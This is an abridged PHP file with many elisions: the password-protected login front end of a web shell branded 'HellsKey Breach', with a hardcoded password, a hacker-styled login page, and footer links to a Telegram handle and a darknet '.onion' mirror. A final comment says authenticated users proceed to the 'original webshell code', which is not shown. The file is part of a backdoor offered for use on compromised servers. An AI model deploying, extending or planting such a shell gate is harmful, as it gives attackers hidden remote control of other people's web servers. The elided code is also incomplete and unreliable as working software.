...
define('AUTH_PASS', 'x708@07x');
define('SESSION_KEY', 'hellskey_auth');
...
if (!isset($_SESSION[SESSION_KEY]) || $_SESSION[SESSION_KEY] !== true) {
    ...
    if (isset($_POST['login_submit'])) {
        ...
        if ($user === AUTH_USER && $pass === AUTH_PASS) {
            ...
            // Redirect to same page to show actual content
    ...
    <head>
        ...
        <title>HellsKey Breach – Login</title>
        <style>
            * {
                margin: 0;
                padding: 0;
            ...
            body {
                background: linear-gradient(135deg, #0a0f1a 0%, #0c111a 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
            ...
            .logo {
                ...
                height: 120px;
                margin: 0 auto 20px;
                background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="45" fill="none" stroke="%2300ff41" stroke-width="2"/><path d="M30,50 L70,50 M50,30 L50,70" stroke="%2300ff41" stroke-width="2"/><circle cx="50" cy="50" r="10" fill="%2300ff41"/><text x="50" y="90" text-anchor="middle" fill="%2300ff41" font-size="12">HellsKey</text></svg>') no-repeat center;
    ...
    <body>
        <div class="login-container">
            ...
            <div class="footer">
                👁‍🗨 HellsKey Breach – Elite OSINT Framework<br>
                📱 <a href="https://t.me/HellsKey" target="_blank">@HellsKey</a> | 🌐 <a href="http://2dpg7coa4gi4rw2pjaor4cwwcelspqlpt2yvmu6avgk6mq3jmwz6pxad.onion" target="_blank">Darknet Mirror</a>
            </div>
        </div>
    </body>
    </html>
...
// --- If authenticated, proceed with original webshell code ---
// (All original code from breach.php remains exactly as provided)
